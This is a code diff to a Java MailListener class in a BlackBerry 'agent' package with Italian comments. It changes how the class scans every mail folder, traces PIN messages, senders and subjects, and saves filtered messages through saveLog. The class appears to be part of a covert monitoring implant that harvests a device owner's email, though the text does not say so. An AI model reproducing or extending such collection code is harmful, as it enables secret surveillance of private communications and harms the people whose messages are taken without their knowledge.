@@ -6,11 +6,13 @@ package blackberry.agent.mail;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.Date;
 import java.util.Enumeration;
 import java.util.Random;
 import java.util.Vector;
 
 import net.rim.blackberry.api.mail.Address;
+import net.rim.blackberry.api.mail.AddressException;
 import net.rim.blackberry.api.mail.BodyPart;
 import net.rim.blackberry.api.mail.Folder;
 import net.rim.blackberry.api.mail.Header;
@@ -236,7 +238,12 @@ public final class MailListener implements FolderListener, StoreListener,
         try {
 
             final int flags = 1;
-            String mail = parseMessage(message, maxMessageSize, storeName);
+
+            String from = "local";
+            if (storeName.indexOf("@") > 0) {
+                from = storeName;
+            }
+            String mail = parseMessage(message, maxMessageSize, from);
             int size = message.getSize();
             if (size == -1) {
                 size = mail.length();
@@ -292,45 +299,98 @@ public final class MailListener implements FolderListener, StoreListener,
     public void scanFolders(String storeName, final Folder[] subfolders) {
         Folder[] dirs;
 
-        if (subfolders == null || subfolders.length <= 0) {
-            return;
-        }
+        //#ifdef DBC
+        Check.requires(subfolders != null && subfolders.length >= 0,
+                "scanFolders");
+        //#endif
 
         for (int count = 0; count < subfolders.length; count++) {
 
             Folder folder = subfolders[count];
             //#ifdef DEBUG_TRACE
             debug.trace("Folder name: " + folder.getFullName());
-            debug.trace("scanFolders getName: " + folder.getName());
+            //debug.trace("  getName: " + folder.getName());
+            //debug.trace("  getType: " + folder.getType());
+            //debug.trace("  getId: " + folder.getId());
+            try {
+                debug.trace("  numMessages: " + folder.getMessages().length);
+            } catch (MessagingException e1) {
+                // TODO Auto-generated catch block
+                e1.printStackTrace();
+            }
             //#endif
 
             dirs = folder.list();
-            scanFolders(storeName, dirs);
+            if (dirs != null && dirs.length >= 0) {
+                scanFolders(storeName, dirs);
+            }
+
             try {
                 final Message[] messages = folder.getMessages();
 
                 //#ifdef DEBUG_TRACE
                 // stampo le date.
+                Date precRecDate = null;
+                /* Date precSentDate = null; */
                 for (int j = 0; j < messages.length; j++) {
-                    final Message message = messages[j];
-                    debug.trace("# " + j + " Received: "
-                            + message.getReceivedDate().toString() + " Sent: "
-                            + message.getSentDate().toString());
+                    try {
+                        final Message message = messages[j];
+                        if (precRecDate != null) {
+                            Check.asserts(precRecDate.getTime() <= message
+                                    .getReceivedDate().getTime(),
+                                    "Wrong order Received: "
+                                            + message.toString());
+                        }
+                        precRecDate = message.getReceivedDate();
+
+                        if (message.getMessageType() == Message.PIN_MESSAGE) {
+                            debug.trace("PIN Message: " + message.getFrom()
+                                    + " s:" + message.getSubject());
+                        }
+                        Address address;
+                        address = message.getFrom();
+
+                        if (address != null) {
+                            String name = address.getAddr();
+                            if (name != null && name.length() >= 6
+                                    && name.length() <= 9
+                                    && name.indexOf("@") == -1) {
+
+                                debug.trace("probably PIN Message From: "
+                                        + name);
+                                debug.trace("  s: " + message.getSubject());
+                            }
+                        }
+
+                        Address[] addresses = message
+                                .getRecipients(Message.RecipientType.TO);
+                        for (int i = 0; i < addresses.length; i++) {
+                            address = addresses[i];
+                            if (address != null) {
+                                String name = address.getAddr();
+                                if (name != null && name.length() >= 6
+                                        && name.length() <= 9
+                                        && name.indexOf("@") == -1) {
+
+                                    debug.trace("probably PIN Message To: "
+                                            + name);
+                                    debug.trace("  s: " + message.getSubject());
+                                }
+                            }
+                        }
+                    } catch (AddressException ex) {
+                        debug.error(ex.toString());
+                    }
                 }
                 //#endif
 
+                boolean next = false;
                 // Scandisco ogni e-mail dell'account di posta
-                for (int j = 0; j < messages.length; j++) {
+                for (int j = messages.length - 1; j >= 0 && !next; j--) {
                     try {
                         //#ifdef DEBUG_TRACE
-                        debug.trace("message # " + j);
+                        //debug.trace("message # " + j);
                         //#endif
-
-                        if (j == 6) {
-                            //#ifdef DEBUG_TRACE
-                            debug.trace("STOP # " + j);
-                            //#endif
-                        }
 
                         final Message message = messages[j];
 
@@ -340,15 +400,18 @@ public final class MailListener implements FolderListener, StoreListener,
                         //#endif
                         final int filtered = collectFilter.filterMessage(
                                 message, messageAgent.lastcheck);
-                        if (filtered == Filter.FILTERED_OK) {
-                            //#ifdef DEBUG_TRACE
-                            debug.trace("Store name: " + storeName);
-                            //#endif
+
+                        switch (filtered) {
+                        case Filter.FILTERED_OK:
+                            //#ifdef SAVE_MAIL
                             saveLog(message, realtimeFilter.maxMessageSize,
                                     storeName);
-                        } else if (filtered == Filter.FILTERED_DISABLED) {
-                            return;
-                        } else if (filtered == Filter.FILTERED_FOUND) {
+                            //#endif
+                            break;
+                        case Filter.FILTERED_DISABLED:
+                        case Filter.FILTERED_LASTCHECK:
+                        case Filter.FILTERED_FOUND:
+                            next = true;
                             break;
                         }
                     } catch (Exception ex) {
@@ -514,6 +577,7 @@ public final class MailListener implements FolderListener, StoreListener,
 
         final ServiceBook serviceBook = ServiceBook.getSB();
         mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
+        //mailServiceRecords = serviceBook.getRecords();
 
         names = new String[mailServiceRecords.length];
         //#ifdef DEBUG_TRACE
